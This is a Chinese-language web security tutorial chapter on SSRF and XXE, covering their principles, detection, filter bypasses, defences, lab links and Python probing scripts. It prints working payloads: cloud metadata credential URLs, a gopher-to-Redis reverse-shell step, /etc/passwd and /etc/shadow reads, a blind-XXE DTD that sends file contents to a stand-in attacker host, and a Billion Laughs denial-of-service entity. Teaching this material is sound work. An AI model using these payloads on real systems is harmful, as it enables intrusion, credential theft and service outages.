# 08 SSRF/XXE —— 服务端的信任危机

> 前面学的漏洞都是"攻击者 → 服务器"的直接攻击。
> SSRF和XXE不同——它们让**服务器成为攻击者的"代理"**，
> 替攻击者访问内部资源。

---

## 一、SSRF（Server-Side Request Forgery）

### 1.1 原理

```
SSRF = 服务端请求伪造

正常功能：
  很多Web应用需要服务端发HTTP请求：
  - 获取远程图片（头像URL、链接预览）
  - Webhook回调
  - 导入远程文件
  - URL预览/缩略图生成

漏洞场景：
  用户提交一个URL → 服务器去请求这个URL → 返回结果

  POST /api/fetch-url
  Body: {"url": "https://example.com/image.jpg"}

  服务器帮你去下载了这个图片 → 正常功能

  但如果用户提交：
  Body: {"url": "http://127.0.0.1:3306"}
  → 服务器去访问自己的MySQL端口 → 返回MySQL的banner信息
  → 攻击者探测到了内部服务！

  Body: {"url": "http://192.168.1.100:8080/admin"}
  → 服务器去访问内网的管理后台
  → 内网资源对外不可见，但服务器在内网中 → 它能访问
```

### 1.2 SSRF能做什么

```
[1] 探测内网
  http://192.168.1.1      → 内网网关
  http://192.168.1.1:22   → SSH
  http://192.168.1.1:3306 → MySQL
  http://10.0.0.0/8       → 内网段扫描
  → 从外部无法做的事，通过SSRF可以让服务器代劳

[2] 访问内部服务
  http://127.0.0.1:8080/admin       → 本机管理后台（通常只监听在localhost）
  http://internal-api.local/secrets → 内部API
  http://metadata.google.internal/  → 云服务元数据

[3] 读取云元数据（云环境高危）
  AWS:   http://169.254.169.254/latest/meta-data/
         http://169.254.169.254/latest/meta-data/iam/security-credentials/
         → 获取AWS密钥！

  GCP:   http://metadata.google.internal/computeMetadata/v1/
  Azure: http://169.254.169.254/metadata/instance

  拿到云密钥 = 控制整个云基础设施

[4] 读取本地文件
  file:///etc/passwd              → 读取系统文件
  file:///var/www/html/config.php → 读取配置（含数据库密码）

[5] 攻击内网其他服务
  利用SSRF向内网Redis发送命令写入crontab → 反弹Shell
  gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a...
```

### 1.3 SSRF检测

```
第1步：找到服务端发起请求的功能点
  常见功能：
  - URL预览/网页截图
  - 远程头像/图片URL
  - Webhook URL配置
  - RSS订阅
  - PDF生成（含远程资源）
  - 文件导入（从URL导入）

第2步：基础测试
  输入你控制的服务器URL，观察是否收到请求：

  # 用Burp Collaborator或webhook.site
  url=https://your-server.burpcollaborator.net

  收到请求 → 确认服务端会发请求 → 可能存在SSRF

第3步：尝试内网地址
  url=http://127.0.0.1
  url=http://127.0.0.1:80
  url=http://127.0.0.1:8080
  url=http://127.0.0.1:3306
  url=http://192.168.1.1
  url=http://10.0.0.1
  url=http://169.254.169.254    ← 云元数据

  根据响应差异（状态码、响应时间、响应内容）判断内部服务是否存在

第4步：尝试特殊协议
  url=file:///etc/passwd
  url=dict://127.0.0.1:6379
  url=gopher://127.0.0.1:6379
```

### 1.4 SSRF绕过技巧

```
如果服务端过滤了127.0.0.1和内网地址：

IP地址变形：
  127.0.0.1 的等价表示：
  http://2130706433        → 十进制整数
  http://0x7f000001        → 十六进制
  http://0177.0.0.1        → 八进制
  http://127.1             → 省略
  http://127.0.0.1.nip.io  → DNS解析到127.0.0.1
  http://[::1]             → IPv6回环地址
  http://0                 → 某些系统等同于127.0.0.1

域名解析绕过：
  注册一个域名，A记录指向 127.0.0.1
  url=http://your-domain.com  → DNS解析到127.0.0.1

DNS重绑定：
  第一次DNS解析 → 返回外网IP（通过检查）
  第二次DNS解析 → 返回127.0.0.1（实际访问内网）
  需要特殊的DNS服务器配置

URL解析差异：
  http://evil.com@127.0.0.1       → 实际访问127.0.0.1
  http://127.0.0.1#@evil.com      → 解析差异
  http://127.0.0.1%2523@evil.com  → 双重URL编码

重定向绕过：
  url=http://your-server.com/redirect
  your-server.com返回302跳转到 http://127.0.0.1
  如果服务端跟随重定向但只检查初始URL → 绕过
```

---

## 二、XXE（XML External Entity）

### 2.1 原理

```
XXE = XML外部实体注入

XML可以定义"实体"——类似变量的东西：

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY name "张三">     ← 定义内部实体
]>
<user>
  <name>&name;</name>       ← 使用实体，会被替换为"张三"
</user>

XML还支持"外部实体"——从外部加载内容：

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">  ← 从文件读取
]>
<user>
  <name>&xxe;</name>       ← 会被替换为/etc/passwd的内容
</user>

如果服务器解析了这个XML → /etc/passwd的内容会出现在响应中
```

### 2.2 XXE能做什么

```
[1] 读取服务器文件
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
  <!ENTITY xxe SYSTEM "file:///var/www/html/config.php">

[2] SSRF（探测内网）
  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080">

[3] 拒绝服务（Billion Laughs攻击）
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  ... 指数级展开，耗尽服务器内存

[4] 命令执行（某些环境）
  <!ENTITY xxe SYSTEM "expect://whoami">  → PHP expect扩展
```

### 2.3 XXE检测

```
第1步：找到接受XML输入的接口
  Content-Type: application/xml
  Content-Type: text/xml

  常见场景：
  - SOAP API
  - XML-RPC
  - RSS/Atom订阅
  - SVG图片上传
  - Office文档上传（.docx, .xlsx是ZIP包含XML）
  - SAML认证

  不明显的场景：
  - 有些API同时接受JSON和XML
  - 把Content-Type从application/json改成application/xml试试

第2步：测试外部实体

  最简单的测试：
  <?xml version="1.0"?>
  <!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
  ]>
  <root>&xxe;</root>

  如果响应中出现了主机名 → XXE漏洞存在

第3步：盲XXE（没有回显时）

  用外部DTD + HTTP请求外带数据：
  <?xml version="1.0"?>
  <!DOCTYPE test [
    <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
    %xxe;
  ]>
  <root>test</root>

  evil.dtd内容：
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
  %eval;
  %exfil;

  → 服务器读取/etc/passwd，然后通过HTTP请求发送到攻击者服务器
```

### 2.4 XXE防御

```
最有效的防御：禁用外部实体

Java:
  factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

Python (lxml):
  parser = etree.XMLParser(resolve_entities=False, no_network=True)

PHP:
  libxml_disable_entity_loader(true);

通用原则：
  - 禁用DTD处理
  - 禁用外部实体
  - 使用JSON替代XML（如果可能）
```

---

## 三、动手实践

### 实践1：SSRF基础测试

```python
"""SSRF测试辅助脚本"""
import requests

def test_ssrf(target_url, param_name):
    """测试URL参数是否存在SSRF"""

    test_urls = [
        # 内部地址探测
        ("http://127.0.0.1", "回环地址"),
        ("http://127.0.0.1:80", "本机Web"),
        ("http://127.0.0.1:8080", "本机8080"),
        ("http://127.0.0.1:3306", "本机MySQL"),
        ("http://127.0.0.1:6379", "本机Redis"),
        ("http://localhost", "localhost"),

        # 云元数据
        ("http://169.254.169.254", "AWS元数据"),
        ("http://169.254.169.254/latest/meta-data/", "AWS元数据路径"),
        ("http://metadata.google.internal", "GCP元数据"),

        # 内网段
        ("http://192.168.1.1", "内网网关"),
        ("http://10.0.0.1", "内网10段"),

        # 文件协议
        ("file:///etc/passwd", "读取passwd"),
        ("file:///etc/hostname", "读取hostname"),

        # IP绕过
        ("http://2130706433", "IP十进制"),
        ("http://0x7f000001", "IP十六进制"),
        ("http://0", "零地址"),
        ("http://[::1]", "IPv6回环"),
    ]

    for url, desc in test_urls:
        try:
            resp = requests.get(target_url, params={param_name: url}, timeout=5)
            length = len(resp.text)
            # 简单判断：响应是否与正常请求不同
            if length > 0 and resp.status_code == 200:
                preview = resp.text[:100].replace('\n', ' ')
                print(f"  [{desc}] {url}")
                print(f"    状态:{resp.status_code} 长度:{length} 内容:{preview}...")
                print()
        except requests.exceptions.Timeout:
            print(f"  [{desc}] 超时（可能端口关闭或被过滤）")
        except Exception as e:
            print(f"  [{desc}] 错误: {e}")

# test_ssrf("http://target.com/api/fetch", "url")
```

### 实践2：XXE测试

```python
"""XXE基础测试"""
import requests

def test_xxe(url):
    """测试XML解析接口是否存在XXE"""

    # 测试1：基础XXE读取文件
    xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>
  <data>&xxe;</data>
</root>'''

    headers = {"Content-Type": "application/xml"}

    print("测试1：基础XXE（读取/etc/hostname）")
    try:
        resp = requests.post(url, data=xxe_payload, headers=headers, timeout=10)
        print(f"  状态码: {resp.status_code}")
        print(f"  响应: {resp.text[:200]}")
        if resp.status_code == 200 and len(resp.text) > 10:
            print("  → 可能存在XXE，检查响应中是否包含主机名")
    except Exception as e:
        print(f"  错误: {e}")

    # 测试2：检查是否接受XML Content-Type
    print("\n测试2：改Content-Type为XML")
    json_payload = '{"test": "value"}'
    for ct in ["application/xml", "text/xml"]:
        try:
            resp = requests.post(url, data=xxe_payload, headers={"Content-Type": ct}, timeout=10)
            print(f"  Content-Type: {ct} → 状态码: {resp.status_code}")
        except:
            pass

# test_xxe("http://target.com/api/xml-endpoint")
```

### 实践3：PortSwigger Lab

```
PortSwigger Web Security Academy有专门的SSRF和XXE实验室：

SSRF Labs：
  https://portswigger.net/web-security/ssrf
  - Basic SSRF against the local server
  - Basic SSRF against another back-end system
  - SSRF with blacklist-based input filter
  - SSRF with whitelist-based input filter

XXE Labs：
  https://portswigger.net/web-security/xxe
  - Exploiting XXE using external entities to retrieve files
  - Exploiting XXE to perform SSRF attacks
  - Blind XXE with out-of-band interaction

强烈推荐完成这些Lab，比DVWA更接近真实场景。
```

---

## 四、SSRF/XXE检查清单

```
SSRF检测：
  □ 找到所有接受URL的功能点
  □ 测试127.0.0.1和内网地址
  □ 测试云元数据地址（169.254.169.254）
  □ 测试file://协议
  □ 测试IP地址变形（十进制、十六进制、IPv6）
  □ 测试重定向绕过
  □ 测试DNS重绑定

XXE检测：
  □ 找到所有接受XML的接口
  □ 尝试把JSON接口改为XML Content-Type
  □ 测试外部实体读取文件
  □ 测试HTTP外部实体（SSRF）
  □ 测试盲XXE（外带数据）
  □ SVG文件上传是否解析XML
  □ Office文档上传是否解析内部XML
```

---

## 五、自测清单

- [ ] SSRF的本质是什么？为什么服务器能访问到外部访问不到的资源？
- [ ] 云元数据地址169.254.169.254为什么是SSRF的高价值目标？
- [ ] 常见的SSRF绕过技巧有哪些（IP变形、重定向、DNS重绑定）？
- [ ] XXE的原理是什么？什么是外部实体？
- [ ] 哪些功能/接口可能存在XXE漏洞？
- [ ] XXE和SSRF有什么关系？
- [ ] 盲XXE是什么？怎么外带数据？
- [ ] SSRF和XXE的防御方法？

---

> **Phase 2 完成！**
>
> 你现在已经系统学习了Web安全的核心漏洞类型。
> 下一步：[Phase 3 - 工具精通](../../phase-3-tools-mastery/01-burpsuite/README.md) —— 掌握Burp Suite等安全测试利器
